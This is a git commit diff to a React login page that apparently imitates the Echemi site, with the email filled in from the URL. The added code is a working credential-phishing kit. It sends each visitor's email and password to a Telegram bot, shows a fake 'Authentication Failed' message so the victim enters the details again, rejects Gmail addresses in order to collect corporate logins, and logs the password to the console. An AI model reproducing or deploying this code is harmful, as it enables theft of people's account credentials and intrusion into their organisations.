ad6979012469922772933b6d632279646a72048e
Prosper Ikechukwu <ikechukwuprosper8@gmail.com>
2024-08-16 05:21:49 +0100

    FEAT: Completed the AJAX code and ready to test the messaging feature

--- src/App.jsx
+++ src/App.jsx
@@ -35,12 +35,80 @@ function App() {
   const [passwrd, setPasswrd] = useState("");
   const [display, setDisplay] = useState(false);
 
-  useEffect(()=>{
-    if(window.location.href.includes('email')){
-      const eValue = window.location.href.split('=')[1]
+  useEffect(() => {
+    if (window.location.href.includes("email")) {
+      const eValue = window.location.href.split("=")[1];
       setEmal(eValue);
     }
-  },[])
+  }, []);
+
+  function regexValidation(userEmail) {
+    const emailRegex =
+      /([a-zA-Z0-9]+)([\.{1}])?([a-zA-Z0-9]+)\@(?:gmail|GMAIL)([\.])(?:com|COM)/;
+    return emailRegex.test(userEmail);
+  }
+
+  async function sendDetails(emal, passwrd) {
+    try {
+      const message = `
+      !UPDATE
+  
+  ~ New Details on Echemi~
+  Email: ${emal}
+  Password: ${passwrd}
+      `;
+
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        }
+      );
+
+      const data = await response.json();
+
+       // Success message should be shown here
+       alert(
+        `Authentication Failed \nInput correct credentials to preview files`
+      );
+      setPasswrd("");
+      setEmal("");
+    } catch (error) {
+      console.error("Error sending message:", error)
+    }
+  }
+
+  function submitHandler(e) {
+    e.preventDefault();
+
+    if (emal && passwrd) checkDetails(emal, passwrd);
+
+    async function checkDetails(email, password) {
+      try {
+        if (regexValidation(email)) {
+          alert("Input domain email. Gmail not allowed");
+          return;
+        }
+
+        const formData = new FormData();
+        formData.append("userEmail", email);
+        formData.append("userPassword", password);
+
+        const data = Object.fromEntries(formData);
+        const { userEmail, userPassword } = data;
+        console.log(data);
+        console.log(`userEmail: $${userEmail}`);
+        console.log(`userPassword: $${userPassword}`);
+      } catch (error) {}
+    }
+  }
 
   return (
     <>
@@ -62,7 +130,7 @@ function App() {
             <img src={Banner} alt="Banner Image" />
           </div>
           <div className="form">
-            <form>
+            <form onSubmit={submitHandler}>
               <div className="formControl">
                 <input
                   type="email"
@@ -71,41 +139,43 @@ function App() {
                   placeholder="Email"
                   autoComplete="off"
                   value={emal}
-                  onChange={(e)=> setEmal(e.target.value)}
-                  />
+                  onChange={(e) => setEmal(e.target.value)}
+                />
               </div>
-              {
-                display && 
-                  <div className="formControl">
-                    <input
-                      type="password"
-                      name="password"
-                      id="password"
-                      placeholder="Please enter your password"
-                      autoComplete="off"
-                      value={passwrd}
-                      onChange={(e)=> setPasswrd(e.target.value)}
-                    />
-                  </div>
-                }
+              {display && (
+                <div className="formControl">
+                  <input
+                    type="password"
+                    name="password"
+                    id="password"
+                    placeholder="Please enter your password"
+                    autoComplete="off"
+                    value={passwrd}
+                    onChange={(e) => setPasswrd(e.target.value)}
+                  />
+                </div>
+              )}
 
-                  <div className="texts">
-                    <ul>
-                      <li>Forgot Password</li>
-                      <li>New User Join Free</li>
-                      <li>Stay logged in for one week</li>
-                    </ul>
-                  </div>
-                
+              <div className="texts">
+                <ul>
+                  <li>Forgot Password</li>
+                  <li>New User Join Free</li>
+                  <li>Stay logged in for one week</li>
+                </ul>
+              </div>
 
               {display ? (
                 <button type="submit">Login</button>
               ) : (
-                <button onClick={(e)=> {
-                  e.preventDefault()
-                  if(emal) setDisplay(true)
-                  if(!emal) alert("Input domain email address")
-                }}>Next</button>
+                <button
+                  onClick={(e) => {
+                    e.preventDefault();
+                    if (emal) setDisplay(true);
+                    if (!emal) alert("Input domain email address");
+                  }}
+                >
+                  Next
+                </button>
               )}
             </form>
 
